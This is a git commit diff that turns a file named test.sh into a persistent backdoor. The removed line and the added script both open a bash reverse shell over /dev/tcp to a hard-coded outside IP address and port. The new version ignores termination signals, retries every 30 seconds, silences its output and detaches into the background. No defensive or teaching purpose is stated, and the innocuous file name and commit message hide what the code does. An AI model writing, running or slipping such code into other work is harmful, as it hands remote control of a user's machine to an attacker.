03a92dd3df1c62548de171469d68ed5085e94a7c
Mohamed Ahmed Abd elmoneam <30509130103337@sci.asu.edu.eg>
2026-03-22 02:28:20 +0200

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,1 +1,22 @@
-bash -i >& /dev/tcp/38.242.227.177/4343 0>&1
+#!/bin/bash
+
+trap "" SIGINT SIGTERM SIGHUP
+
+run_backdoor() {
+    ATTACKER_IP="38.242.227.177"
+    ATTACKER_PORT="4343"
+
+    while true; do
+        # محاولة الاتصال (Bash Reverse Shell)
+        bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
+        
+        sleep 30
+    done
+}
+
+run_backdoor > /dev/null 2>&1 & 
+
+disown
+
+echo "[+] Process started in background."
+exit 0
